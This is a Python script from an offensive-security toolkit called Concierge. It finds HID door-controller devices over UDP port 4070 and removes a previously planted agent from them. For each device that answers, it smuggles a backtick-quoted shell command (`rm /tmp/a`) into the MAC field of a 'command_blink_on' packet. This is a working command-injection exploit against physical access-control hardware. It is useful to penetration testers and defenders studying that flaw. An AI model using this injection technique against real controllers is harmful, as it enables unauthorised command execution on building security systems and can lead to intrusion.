#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

# Requires netaddr
# To install: pip install netaddr

import socket
import argparse
import netaddr
if __name__ == '__main__':
  parser = argparse.ArgumentParser(usage='./massclean.py -f agents.txt')
  parser.add_argument('-f', '--infile', default="agents.txt", help='Line delimited list of targets for agent removal (default: agents.txt)')
  args = parser.parse_args()
  rport = 4070
  infile = args.infile
  print "####################################"
  print "# Conceirge HID Mass Agent Cleanup #"
  print "####################################"
  print ""
  with open(infile) as f:
    for ip in f:
      try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setblocking(0)
        pkt0 = "discover;013;"
        print "[*] Sending Discovery Packet to: "+str(netaddr.IPAddress(ip))
        s.sendto(pkt0, (str(netaddr.IPAddress(ip)), rport))
        s.settimeout(0.35)
        rspn = s.recv(1024)
        if rspn.split(";")[0] == "discovered":
          rmac = rspn.split(";")[2]
          pkt1 = "command_blink_on;044;"+rmac+";1`rm /tmp/a`;"
          print "[$] Removing agent from: "+str(netaddr.IPAddress(ip))
          s.sendto(pkt1, (str(netaddr.IPAddress(ip)), rport))
          s.close
      except (KeyboardInterrupt, SystemExit):
        s.close
        print "Keyboard Interrupt"
        raise
      except (socket.timeout, socket.error):
        s.close
        continue
  print ""
  print "[*] Cleanup complete."
